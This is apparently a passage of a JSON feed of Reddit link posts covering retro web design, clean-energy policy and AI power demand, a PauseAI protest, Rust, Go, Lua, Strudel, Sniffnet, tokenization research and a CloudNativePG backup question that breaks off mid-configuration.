extent.\n\t\t\tIf the image was inside of an  tag, the attribute \n\t\t\tcould be added to the image. When clicking, the browser would navigate to the URL in the link,\n\t\t\tbut adds the X and Y coordinate as  query string to the URL.\n\t\t\tThis allows a server to check where in the image the user clicked. This allowed for image based menus,\n\t\t\tor a \"Where's Waldo\" (or \"Wally\" in some countries) style game.\n\t\t\tLater came client side image maps, which are invisible clickable regions you could overlay over an image.\n\t\t</p><p>\n\t\t\tBoth of these technologies still work,\n\t\t\tnone of them are marked as deprecated either.\n\t\t</p><p>\n\t\t\tYolo driven development was the norm back then for personal sites and small company pages.\n\t\t\tYou changed a few lines, then uploaded your changes to your webserver with an FTP client,\n\t\t\tlikely not even encrypted.\n\t\t\tYour choices were PHP on an Apache web server and ASP on an IIS.\n\t\t\tStaging environment? What staging environment?\n\t\t</p><p>\n\t\t\tIt was crude, but oh boy was it fast to get something going.\n\t\t\tPHP is easy to get started, more forgiving than other languages, available practically everywhere,\n\t\t\tand still actively maintained.\n\t\t\tAt this point it has probably gained cockroach status and will be around for ages.\n\t\t</p><p>\n\t\t\tThis is also how this website is deployed. Except instead of FTP I use syncthing\n\t\t\tbecause I want it to upload automatically when I change something,\n\t\t\tbut straight to prod it goes.\n\t\t\tIt doesn't needs any form of compilation or build process whatsoever.\n\t\t</p><p>\n\t\t\tSimpler times. Not necessarily better, but simpler.\n\t\t\tWe achieved a lot with less. We optimized our media, and used very little scripting.\n\t\t\tNow we don't. Nobody cares anymore if your website is 10 or 20 megabytes.\n\t\t\tDo I miss creating websites in a plain text editor? No. I want to keep my IDE with syntax highlighting,\n\t\t\tsyntax checking, and code completion.\n\t\t\tI also want to keep the libraries that make my life easier.\n\t\t\tI haven't written an SQL statement in my backend code for a long time now.\n\t\t\tSQL ORM mappers are great.<p>\n\t\t\tDo I wish we would create simpler pages again? Yes.\n\t\t\tI believe that although websites back then were simpler and technology more limited,\n\t\t\tit was not necessarily worse than today, but the average website now feels bloated and overengineered.\n\t\t\tThe internet is no longer a place of creation; it is a place of consumption.\n\t\t\tI want the world wide web wild west back (call it W5 or whatever).\n\t\t\tI want search engines to find wacky websites again.\n\t\t\tI don't want to please algorithms of our corporate overlords.</p>\n\t\t\tWriting this page, I just found out that in 2021, Warner Bros has taken down the original Space Jam website from 1996.\n\t\t\tI would have liked to put it here,\n\t\t\t<a rel=\"noopener noreferrer nofollow\" href=\"https://web.archive.org/web/20200404221000/https://www.spacejam.com/\" target=\"_blank\">but I guess the web archive is your only hope now</a>.\n\t\t\tIf you have time, check out how the main menu on that site was made.\n\t\t</p><p>\n\t\t\tIn any case, my tribute to those times is a wordle clone.\n\t\t\tIf you have Internet Explorer 1.5 or later, or any modern browser (I heard this Mozilla thing is taking off),\n\t\t\tyou can play <a href=\"https://wordle.ayra.ch/\">a game of wordle here</a>.\n\t\t\tI recommend you use at least IE 2.0 because 1.5 lacks color support, which makes the clues less visible.\n\t\t</p><p>\n\t\t\tIf you want to go super oldschool and can get a copy of NCSA Mosaic running (the first ever web browser),\n\t\t\tyou can play <a href=\"http://wordle.ayra.ch:8081/mosaic.php\">the game here instead</a>.\n\t\t\tI can confirm the browser does run on Windows XP, and possibly later versions of Windows,\n\t\t\tbut likely only on 32 bit versions.</p><p>\n\t\t\tNote: The WWW was designed to share crudely formatted scientific documents and link them,\n\t\t\twhich explains why it's so hostile towards making screen oriented applications\n\t\t\tbut has a plethora of features what work well for print media.\n\t\t\tThis early feature set is exactly what Mosaic 1.0 provides.\n\t\t\tIt lacks color support and doesn't even has means for text input,\n\t\t\tbut I managed to cobble together something for it anyways.\n\t\t\tIts HTTP support is best described as \"somewhat there\", which explains why this wordle version runs on its own port.\n\t\t</p><p>\n\t\t\tYou're experiencing it right now.\n\t\t\tThis website is looped through a RS-232 serial connection at 56k baud rate\n\t\t\t(actually a little bit extra to handle protocol overhead).\n\t\t\tI disabled the server cache so you can experience the scrollbar shrinking as content slowly loads in.\n\t\t\tBut some things are worth the time. People may not even notice that your website is slow\n\t\t\tif you give them a bit of content to read before shoving an AI generated title image down their throat.<p>\n\t\t\tYou don't need a serial loopback for this,\n\t\t\ta tool like </p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/AyrA/SlowPipe\">SlowPipe</a> in front of your server does the same.\n\t\t</p>","contentLength":21279,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lp8efe/websites_used_to_be_simple/"},{"title":"The Senate Just Put Clean Energy for AI in the Crosshairs","url":"https://www.wired.com/story/the-senate-just-put-clean-energy-for-ai-in-the-crosshairs/","date":1751390804,"author":"/u/wiredmagazine","guid":179228,"unread":true,"content":"<p>Even without the industry-ending excise tax, experts still <a data-offer-url=\"https://x.com/tylerhnorris/status/1940016653036580883\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://x.com/tylerhnorris/status/1940016653036580883&quot;}\" href=\"https://x.com/tylerhnorris/status/1940016653036580883\" rel=\"nofollow noopener\" target=\"_blank\">say</a> that the forced retirement of the tax credits blows up valuable investment in projects already in the pipeline. Since the beginning of the year, the clean energy industry has felt the pressure of looming IRA rollbacks. According to an <a data-offer-url=\"https://e2.org/releases/may-25-clean-economy-works/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://e2.org/releases/may-25-clean-economy-works/&quot;}\" href=\"https://e2.org/releases/may-25-clean-economy-works/\" rel=\"nofollow noopener\" target=\"_blank\">analysis</a> from energy NGO E2, around $15.5 billion in investment in new clean energy projects and factories has been lost since the start of the year, including more than $9 billion in Republican congressional districts.</p><p>The intense hostility for solar and wind coming from the Trump administration may seem, to a logical person, to be at odds with its goal of “energy dominance.” Energy experts say that renewables—particularly when paired with batteries—are helping to bolster the US grid as energy needs soar. Texas, for instance, added more solar and battery storage than any other type of energy to its grid last year. As of this spring, wind and solar combined made up <a href=\"https://docs.house.gov/meetings/IF/IF03/20250325/118040/HHRG-119-IF03-Wstate-VegasP-20250325.pdf\">42 percent</a> of Texas’s installed generation capacity, more than any other state in the US. All that new solar and storage has, in turn, helped the grid stay stable during peak use, <a href=\"https://insideclimatenews.org/news/28062025/texas-battery-storage-solar-reduces-summer-blackout-risk/\">lowering the risk of blackouts</a> during the first heatwaves of the summer—even as Texas faces <a href=\"https://www.axios.com/local/dallas/2025/06/27/texas-energy-demand-record-data-center-ercot\">never-before-seen summer demand</a> this year, thanks to hot temperatures and the addition of energy-thirsty data centers. Yet in an <a data-offer-url=\"https://nypost.com/2025/06/27/opinion/how-the-big-beautiful-bill-will-lower-energy-costs-bolster-the-electric-grid-and-unleash-us-prosperity/?utm_medium=social&amp;utm_campaign=nypost_opinion&amp;utm_source=twitter\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://nypost.com/2025/06/27/opinion/how-the-big-beautiful-bill-will-lower-energy-costs-bolster-the-electric-grid-and-unleash-us-prosperity/?utm_medium=social&amp;utm_campaign=nypost_opinion&amp;utm_source=twitter&quot;}\" href=\"https://nypost.com/2025/06/27/opinion/how-the-big-beautiful-bill-will-lower-energy-costs-bolster-the-electric-grid-and-unleash-us-prosperity/?utm_medium=social&amp;utm_campaign=nypost_opinion&amp;utm_source=twitter\" rel=\"nofollow noopener\" target=\"_blank\">op-ed</a> published in the New York Post last week, Energy Secretary Chris Wright said that wind and solar contribute to a “less stable grid.”</p><p>Doug Lewin, an energy analyst based in Austin, points out that solar and batteries are particularly <a data-offer-url=\"https://x.com/douglewinenergy/status/1921986007966372187\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://x.com/douglewinenergy/status/1921986007966372187&quot;}\" href=\"https://x.com/douglewinenergy/status/1921986007966372187\" rel=\"nofollow noopener\" target=\"_blank\">well-positioned</a> to help out with grid demand during heatwaves, when the sun is shining—and people turn on their air conditioners.</p><p>“We’re just in this situation where we are going to need massive amounts of power to deal with the heat,” he says. “We’ve gotta have air conditioning to keep people healthy and safe during these hellacious summers, which are getting worse. That’s just an objective matter.”</p><p>It’s particularly ironic to see these kinds of pushbacks as the Trump administration goes all in on artificial intelligence, which, by some projections, could comprise nearly <a data-offer-url=\"https://www.mckinsey.com/featured-insights/sustainable-inclusive-growth/charts/ais-power-binge\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.mckinsey.com/featured-insights/sustainable-inclusive-growth/charts/ais-power-binge&quot;}\" href=\"https://www.mckinsey.com/featured-insights/sustainable-inclusive-growth/charts/ais-power-binge\" rel=\"nofollow noopener\" target=\"_blank\">12 percent of US power demand</a> by the end of the decade. Right now, a global backlog in gas turbines is spelling trouble for those looking to scale up fast. Turbine producers like GE Vernova <a data-offer-url=\"https://naturalgasintel.com/news/higher-for-longer-natural-gas-power-with-equipment-sold-out-through-2027-says-ge-vernova-ceo/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://naturalgasintel.com/news/higher-for-longer-natural-gas-power-with-equipment-sold-out-through-2027-says-ge-vernova-ceo/&quot;}\" href=\"https://naturalgasintel.com/news/higher-for-longer-natural-gas-power-with-equipment-sold-out-through-2027-says-ge-vernova-ceo/\" rel=\"nofollow noopener\" target=\"_blank\">say</a> they’ve already filled orders for the next few years, and project it may take several years for new customers to get their hands on a completed turbine. In April, the CEO of renewable and utility giant NextEra Energy <a data-offer-url=\"https://www.investor.nexteraenergy.com/~/media/Files/N/NEE-IR/reports-and-fillings/quarterly-earnings/2025/Q1%202025/Final_Q1%202025%20Script_vF.pdf\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.investor.nexteraenergy.com/~/media/Files/N/NEE-IR/reports-and-fillings/quarterly-earnings/2025/Q1%202025/Final_Q1%202025%20Script_vF.pdf&quot;}\" href=\"https://www.investor.nexteraenergy.com/~/media/Files/N/NEE-IR/reports-and-fillings/quarterly-earnings/2025/Q1%202025/Final_Q1%202025%20Script_vF.pdf\" rel=\"nofollow noopener\" target=\"_blank\">told shareholders</a> that he expects renewables to act as a “bridge,” helping to bolster the grid and buy time until bigger gas projects can come online.</p><p>But even with the promise of AI using up every spare electron on the grid, the cultural backlash to renewables is as strong as ever—and it isn’t isolated to the White House. Despite Texas’s reliance on renewables, the state legislature <a data-offer-url=\"https://www.utilitydive.com/news/anti-renewables-bills-die-texas-legislature-power-sector-energy/749709/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.utilitydive.com/news/anti-renewables-bills-die-texas-legislature-power-sector-energy/749709/&quot;}\" href=\"https://www.utilitydive.com/news/anti-renewables-bills-die-texas-legislature-power-sector-energy/749709/\" rel=\"nofollow noopener\" target=\"_blank\">battled</a> over several bills this past session that would have seriously kneecapped solar and wind development in the state. Oklahoma, which relies on wind energy for a third of its energy needs, faces a <a data-offer-url=\"https://heatmap.news/plus/the-fight/spotlight/renewable-energy-ban-oklahoma\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://heatmap.news/plus/the-fight/spotlight/renewable-energy-ban-oklahoma&quot;}\" href=\"https://heatmap.news/plus/the-fight/spotlight/renewable-energy-ban-oklahoma\" rel=\"nofollow noopener\" target=\"_blank\">growing movement</a> to ban renewables altogether. Across the country, local governments, responding to grassroots movements, are pushing back against wind and solar projects on their land. (It’s important to note that many of these movements often include Democrats.)</p><p>Lewin, who wrote about Texas’s legislative drama in detail this year in his <a data-offer-url=\"https://www.douglewin.com/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.douglewin.com/&quot;}\" href=\"https://www.douglewin.com/\" rel=\"nofollow noopener\" target=\"_blank\">newsletter</a>, says it’s too simplistic to ascribe the hostility towards renewables as simply being funded by Big Oil. According to <a data-offer-url=\"https://www.politico.com/live-updates/2025/07/01/congress/senate-bill-to-ease-wind-and-solar-phaseout-00434983\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.politico.com/live-updates/2025/07/01/congress/senate-bill-to-ease-wind-and-solar-phaseout-00434983&quot;}\" href=\"https://www.politico.com/live-updates/2025/07/01/congress/senate-bill-to-ease-wind-and-solar-phaseout-00434983\" rel=\"nofollow noopener\" target=\"_blank\">Politico</a>, Alaska Senator Lisa Murkowski, who has received <a href=\"https://www.opensecrets.org/members-of-congress/lisa-murkowski/summary?cid=N00026050\">hundreds of thousands of dollars in campaign donations</a> from oil and gas interests over the course of her career, was an instrumental figure in changing the final Senate language to remove the excise tax. In Texas, the oil and gas lobby <a data-offer-url=\"https://www.dallasnews.com/news/politics/2025/05/01/renewable-energy-developers-oil-lobby-and-manufacturers-unite-against-bill/\" data-event-click=\"{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.dallasnews.com/news/politics/2025/05/01/renewable-energy-developers-oil-lobby-and-manufacturers-unite-against-bill/&quot;}\" href=\"https://www.dallasnews.com/news/politics/2025/05/01/renewable-energy-developers-oil-lobby-and-manufacturers-unite-against-bill/\" rel=\"nofollow noopener\" target=\"_blank\">united</a> with renewables to defeat a bill that would have made energy prices higher by increasing costs for wind and solar.</p><p>“It feels like you’ve got a large number of really powerful folks who have just decided, or been convinced—and then had that belief reinforced by algorithms over and over—that somehow, wind and solar are the root of all evil and are causing every problem,” Lewin says. “It's bizarre. It's really hard to kind of understand this animus for technologies that have had a huge benefit.”</p>","contentLength":4518,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lp7rj5/the_senate_just_put_clean_energy_for_ai_in_the/"},{"title":"Hayro: An experimental, work-in-progress PDF rasterizer in pure Rust.","url":"https://github.com/LaurenzV/hayro","date":1751390187,"author":"/u/Frexxia","guid":179551,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1lp7hlz/hayro_an_experimental_workinprogress_pdf/"},{"title":"Why does Rust feel so well designed?","url":"https://www.reddit.com/r/rust/comments/1lp7562/why_does_rust_feel_so_well_designed/","date":1751389421,"author":"/u/Glum-Psychology-6701","guid":179134,"unread":true,"content":"<p>I'm coming from Java and Python world mostly, with some tinkering in fsharp. One thing I notice about Rust compared to those languages is everything is well designed. There seems to be well thought out design principles behind everything. Let's take Java. For reasons there are always rough edges. For example List interface has a method called add. Immutable lists are lists too and nothing prevents you from calling add method on an immutable list. Only you get a surprise exception at run time. If you take Python, the zen contradicts the language in many ways. In Fsharp you can write functional code that looks clean, but because of the unpredictable ways in which the language boxes and unboxes stuff, you often get slow code. Also some decisions taken at the beginning make it so that you end up with unfixable problems as the language evolves. Compared to all these Rust seems predictable and although the language has a lot of features, they are all coherently developed and do not contradict one another. Is it because of the creator of the language doing a good job or the committee behind the language features has a good process?</p>","contentLength":1142,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"A black box full of dangers","url":"https://www.reddit.com/r/rust/comments/1lp68zo/a_black_box_full_of_dangers/","date":1751387405,"author":"/u/WanderingCID","guid":179225,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/WanderingCID\"> /u/WanderingCID </a>","contentLength":35,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Pluto is a unique dialect of Lua with a focus on general-purpose programming","url":"https://pluto-lang.org/docs/Introduction","date":1751385145,"author":"/u/ketralnis","guid":179392,"unread":true,"content":"<p>Pluto is a superset of Lua 5.4 designed to assist with general-purpose programming &amp; facilitate cleaner, more streamlined development via:</p><p>Despite the immense additions, Pluto remains highly compatible with Lua:</p><ul><li>(Mostly) compatible with Lua 5.4 source code.\n<ul><li>Our only breakage is the addition of new keywords, which causes conflicts when those keywords are used as identifiers. However, Pluto leverages parser heuristics and — in cases where parser heuristics fail — <a href=\"https://pluto-lang.org/docs/Compatibility#compatibility-mode\">Compatibility Mode</a> to eliminate this concern. Most Lua 5.4 source code will execute flawlessly on Pluto.</li></ul></li><li>Reads and writes Lua 5.4 bytecode meaning it's forwards- and backwards-compatible.\n<ul><li>Only some Pluto features generate backwards-incompatible bytecode, but they will say so in their documentation.</li></ul></li><li>Actively rebases with Lua's main repository. We are not a time-frozen dialect. When Lua 5.5 releases, we intend on updating to that.</li></ul><p>With Compatibility Mode, Pluto has been dropped into large communities and did not break any existing scripts.</p><h2>What does Pluto aspire to be?<a href=\"https://pluto-lang.org/docs/Introduction#what-does-pluto-aspire-to-be\" aria-label=\"Direct link to What does Pluto aspire to be?\" title=\"Direct link to What does Pluto aspire to be?\">​</a></h2><p>Pluto aspires to be a version of Lua with a larger feature-set, that is all. Pluto is not a Lua-killer, an attempted successor, or any of that. Many people (rightly so) love Lua precisely because of the design philosophy. And fundamentally, Pluto is a major deviation from Lua's design philosophy. Some may prefer this, some may not.</p>","contentLength":1373,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lp59bm/pluto_is_a_unique_dialect_of_lua_with_a_focus_on/"},{"title":"Protesters accuse Google of violating its promises on AI safety: 'AI companies are less regulated than sandwich shops'","url":"https://www.businessinsider.com/protesters-accuse-google-deepmind-breaking-promises-ai-safety-2025-6","date":1751384536,"author":"/u/MetaKnowing","guid":179229,"unread":true,"content":"<p>A full-blown courtroom drama — complete with a gavel-wielding judge and an attentive jury, played out in London's King's Cross on Monday, mere steps away from <a target=\"_self\" href=\"https://www.businessinsider.com/google-deepmind-ai-talent-war-aggressive-noncompetes-2025-4\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">Google DeepMind</a>'s headquarters.</p><p>Google was on trial for allegations of breaking its promises on AI safety.</p><p>The participants of this faux-production were protesters from PauseAI, an activist group concerned that tech companies are racing into AI with little regard for safety. On Monday, the group congregated near King's Cross station to demand that Google be more transparent about the safety checks it's running on its most cutting-edge AI models.</p><p>PauseAI argues that <a target=\"_self\" href=\"https://www.businessinsider.com/gen-z-shoppers-google-amazon-2025-6\" data-track-click=\"{&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;tout_click&quot;,&quot;index&quot;:&quot;bi_value_unassigned&quot;,&quot;product_field&quot;:&quot;bi_value_unassigned&quot;}\" rel=\"\">Google</a> broke a promise it made during the 2024 AI Safety Summit in Seoul, Korea, when the company agreed to consider external evaluations of its models and publish details about how external parties, including governments, were involved in assessing the risks.</p><p>When Google launched Gemini 2.5 Pro, its latest frontier model, in April, it did neither of those things. The company said it was because the model was still \"experimental.\" A few weeks later, it released a \"model card\" with some safety details, which some experts criticized for being too thin on details, <a target=\"_blank\" href=\"https://storage.googleapis.com/model-cards/documents/gemini-2.5-pro-preview.pdf\" data-track-click=\"{&quot;click_type&quot;:&quot;other&quot;,&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;outbound_click&quot;}\" rel=\" nofollow\">TechCrunch</a> previously reported. While the safety report made reference to third-party testers, it did not specify who they were.</p><p>\"We are committed to developing AI safely and securely to benefit society,\" a Google DeepMind spokesperson told BI. \"We continue to evolve our model testing and reporting to respond to rapid changes in the technology, and will continue to provide information that supports the responsible use of our AI models.\"</p><p>For PauseAI, this isn't good enough. More importantly, the organization said, it's about not letting any lapse slip by and allowing Google to set a precedent.</p><p>\"If we let Google get away with breaking their word, it sends a signal to all other labs that safety promises aren't important and commitments to the public don't need to be kept,\" said PauseAI organizing director Ella Hughes, addressing the crowd, which had gradually swelled to around 60 people.</p><p>\"Right now, AI companies are less regulated than sandwich shops.\"</p><p>Focusing on the specific issue of the Google safety report is a way for PauseAI to push for a specific and attainable near-term change.</p><p>About 30 minutes into the protest, several intrigued passers-by had joined the cause. After a rousing speech from Hughes, the group proceeded to Google DeepMind's offices, where the fake courtroom production played out. Some Google employees leaving for the day looked bemused as chants of \"Stop the race, it's unsafe\" and \"Test, don't guess\" rang out.</p><p>\"AI regulation on an international level is in a very bad place,\" PauseAI founder Joep Meindertsma told Business Insider, pointing to how US Vice President JD Vance <a target=\"_blank\" href=\"https://www.presidency.ucsb.edu/documents/remarks-the-vice-president-the-artificial-intelligence-action-summit-paris-france\" data-track-click=\"{&quot;click_type&quot;:&quot;other&quot;,&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;outbound_click&quot;}\" rel=\"\">warned against over-regulating AI</a> at the AI Action Summit.</p><p>Monday was the first time PauseAI had gathered over this specific issue, and it's not clear what comes next. The group is engaging with members of UK parliament who will run these concerns up the flagpole, but Meindertsma is reticent to say much about how Google is engaging with the group and their demands.</p><p>Meindertsma hopes support will grow and references polls that suggest the public at large is <a target=\"_blank\" href=\"https://time.com/7213096/uk-public-ai-law-poll/\" data-track-click=\"{&quot;click_type&quot;:&quot;other&quot;,&quot;element_name&quot;:&quot;body_link&quot;,&quot;event&quot;:&quot;outbound_click&quot;}\" rel=\" nofollow\">concerned that AI is moving too fast</a>. The group on Monday was made up of people from different backgrounds, including some who work in tech. Meindertsma himself runs a software development company and regularly uses AI tools from Google, OpenAI, and others.</p><p>\"Their tools are incredibly impressive,\" he said, \"which is the thing that worries me so much.\"</p>","contentLength":3617,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lp4zvi/protesters_accuse_google_of_violating_its/"},{"title":"Is os.Executable() reliable?","url":"https://www.reddit.com/r/golang/comments/1lp4rce/is_osexecutable_reliable/","date":1751383990,"author":"/u/1oddbull","guid":180378,"unread":true,"content":"<div><p>The documentation says no guarantee that the path is pointing to the right executable. But then how do you ship other applications files with your Go executable? eg an Electron app</p></div>   submitted by   <a href=\"https://www.reddit.com/user/1oddbull\"> /u/1oddbull </a>","contentLength":211,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"(Ab)using channels to implement a 3D pipe game","url":"https://jro.sg/go-chan.html","date":1751380987,"author":"/u/jroo1","guid":179181,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1lp3gtq/abusing_channels_to_implement_a_3d_pipe_game/"},{"title":"Who's Hiring - July 2025","url":"https://www.reddit.com/r/golang/comments/1lp3e6p/whos_hiring_july_2025/","date":1751380806,"author":"/u/jerf","guid":179016,"unread":true,"content":"<p>This post will be stickied at the top of until the last week of July (more or less).</p><p>: It seems like Reddit is getting more and more cranky about marking external links as spam. A good job post obviously has external links in it. If your job post does not seem to show up please send modmail. Or wait a bit and we'll probably catch it out of the removed message list.</p><p>Please adhere to the following rules when posting:</p><ul><li>Don't create top-level comments; those are for employers.</li><li>Feel free to reply to top-level comments with on-topic questions.</li><li>Meta-discussion should be reserved for the distinguished mod comment.</li></ul><ul><li>To make a top-level comment you must be hiring directly, or a focused third party recruiter with <strong>specific jobs with named companies</strong> in hand. No recruiter fishing for contacts please.</li><li>The job must be currently open. It is permitted to post in multiple months if the position is still open, especially if you posted towards the end of the previous month.</li><li>The job must involve working with Go on a regular basis, even if not 100% of the time.</li><li>One top-level comment per employer. If you have multiple job openings, please consolidate their descriptions or mention them in replies to your own top-level comment.</li><li>Please base your comment on the following template:</li></ul><p><em>[Company name; ideally link to your company's website or careers page.]</em></p><p><em>[Full time, part time, internship, contract, etc.]</em></p><p><em>[What does your team/company do, and what are you using Go for? How much experience are you seeking and what seniority levels are you hiring for? The more details the better.]</em></p><p><em>[Where are your office or offices located? If your workplace language isn't English-speaking, please specify it.]</em></p><p><em>[Please attempt to provide at least a rough expectation of wages/salary.If you can't state a number for compensation, omit this field. Do not just say \"competitive\". Everyone says their compensation is \"competitive\".If you are listing several positions in the \"Description\" field above, then feel free to include this information inline above, and put \"See above\" in this field.If compensation is expected to be offset by other benefits, then please include that information here as well.]</em></p><p><em>[Do you offer the option of working remotely? If so, do you require employees to live in certain areas or time zones?]</em></p><p><em>[Does your company sponsor visas?]</em></p><p><em>[How can someone get in touch with you?]</em></p>","contentLength":2351,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Strudel: a programming language for writing music","url":"https://strudel.cc/workshop/getting-started/","date":1751379998,"author":"/u/pimterry","guid":179362,"unread":true,"content":"<div data-astro-cid-j75b3yus=\"\"><p>Welcome to the Strudel documentation pages!\nYou’ve come to the right place if you want to learn how to make music with code.</p><p>With Strudel, you can expressively write dynamic music pieces.\nIt is an official port of the <a href=\"https://tidalcycles.org/\">Tidal Cycles</a> pattern language to JavaScript.\nYou don’t need to know JavaScript or Tidal Cycles to make music with Strudel.\nThis interactive tutorial will guide you through the basics of Strudel.<p>\nThe best place to actually make music with Strudel is the </p><a href=\"https://strudel.cc/\">Strudel REPL</a></p><h2>What can you do with Strudel?<a aria-hidden=\"true\" tabindex=\"-1\" href=\"https://strudel.cc/workshop/getting-started/#what-can-you-do-with-strudel\"></a></h2><ul><li>live code music: make music with code in real time</li><li>algorithmic composition: compose music using tidal’s unique approach to pattern manipulation</li><li>teaching: focussing on a low barrier of entry, Strudel is a good fit for teaching music and code at the same time.</li><li>integrate into your existing music setup: either via MIDI or OSC, you can use Strudel as a really flexible sequencer</li></ul><p>Here are some examples of how strudel can sound:</p><p>These examples cannot fully encompass the variety of things you can do, so <a href=\"https://strudel.cc/intro/showcase/\">check out the showcase</a> for some videos of how people use Strudel.</p><p>The best way to start learning Strudel is the workshop.\nIf you’re ready to dive in, let’s start with your <a href=\"https://strudel.cc/workshop/first-sounds/\">first sounds</a></p></div>","contentLength":1199,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lp32gt/strudel_a_programming_language_for_writing_music/"},{"title":"Kamune, secure communication over untrusted networks","url":"https://www.reddit.com/r/golang/comments/1lp2cup/kamune_secure_communication_over_untrusted/","date":1751378254,"author":"/u/hossein1376","guid":178968,"unread":true,"content":"<p>EDIT: This is an experimental project, and is not intended to be used for critical purposes.</p><p>Two weeks ago, Internet access in Iran was shut down nationwide. The remaining services were government-controlled or affiliated. So, I started writing something that allowed for secure communication over untrusted networks. I learned a lot, and it helped me to keep myself busy. I'm curious to know what you guys think about it, and I'm looking forward to your thoughts and suggestions. <a href=\"https://github.com/hossein1376/kamune\">Link</a></p><p>Fun fact: Initially, I named it as such because Kāmune (in Persian means truck) have always reminded me of the word communication. Later on, my sister mentioned that the word can also be read as Kamoon-e, which means ricochet; and now I think it makes more sense to call it that.</p>","contentLength":764,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sniffnet: a free, open source network monitoring app","url":"https://www.reddit.com/r/linux/comments/1lp2288/sniffnet_a_free_open_source_network_monitoring_app/","date":1751377497,"author":"/u/GyulyVGC","guid":178969,"unread":true,"content":"<p>Sniffnet (<a href=\"https://sniffnet.net\">website</a> | <a href=\"https://github.com/GyulyVGC/sniffnet\">GitHub</a>) is a powerful yet intuitive network analysis tool to enable everyone comfortably monitor their Internet traffic.</p><p>I’ve been working on Sniffnet as a side-project for almost 3 years, and its development is today supported by the European Union’s  program.</p><p>The most recent major version of the app was published just a couple days ago and, among the other features, it finally makes Sniffnet available as a Docker image for Linux.</p><p>The latest release also introduces the ability to import data from Packet Capture files in addition to network interfaces, and it turned out Sniffnet is 2x faster than Wireshark at processing them.</p>","contentLength":654,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] The Bitter Lesson is coming for Tokenization","url":"https://www.reddit.com/r/MachineLearning/comments/1lp1lfb/r_the_bitter_lesson_is_coming_for_tokenization/","date":1751376255,"author":"/u/lucalp__","guid":179076,"unread":true,"content":"<p>New to the sub but came across <a href=\"https://www.reddit.com/r/MachineLearning/comments/1hli20i/d_in_byte_latent_transformer_how_is_the_decoded/\">discussion posts</a> on BLT so I figured everyone might appreciate <a href=\"https://lucalp.dev/bitter-lesson-tokenization-and-blt/\">this new post</a>! In it, I highlight the desire to replace tokenization with a general method that better leverages compute and data.</p><p>For the most part, I summarise tokenization's role, its fragility and build a case for removing it. I do an overview of the influential architectures so far in the path to removing tokenization so far and then do a deeper dive into the Byte Latent Transformer to build strong intuitions around some new core mechanics.</p><p>Hopefully it'll be of interest and a time saver for anyone else trying to track the progress of this research effort.</p>","contentLength":659,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"How do I setup backup & restore for CloudNativePG such that it works with an \"ephemeral\" cluster?","url":"https://www.reddit.com/r/kubernetes/comments/1lp15y2/how_do_i_setup_backup_restore_for_cloudnativepg/","date":1751375119,"author":"/u/TemporalChill","guid":179133,"unread":true,"content":"<p>LIKELY ALREADY RESOLVED: I didn't take a bloody backup to begin with. I knowww. Fresh pair of eyes could've saved my entire night.</p><p>I love how easy it is to setup cnpg, but as a new user, the backup/restore bit is sending me. Perusing the docs, I figured this was possible:</p><ol><li><p>Create my cnpg clusters (initdb), with s3 backup configured.</p></li><li><p>After the initdb job has succeeded and the wal backups show up in s3, alter the cnpg cluster manifest to replace initdb bootstrap with the SAME s3 cluster as restore source.</p></li><li><p>Now I can teardown the k8s cluster and rebuild it. Given there are backups in s3, the restoration should be automated and straightforward, no matter how many k8s resets I have.</p></li></ol><pre><code>apiVersion: postgresql.cnpg.io/v1 kind: Cluster metadata: name: uno-postgres spec: storage: size: 5Gi 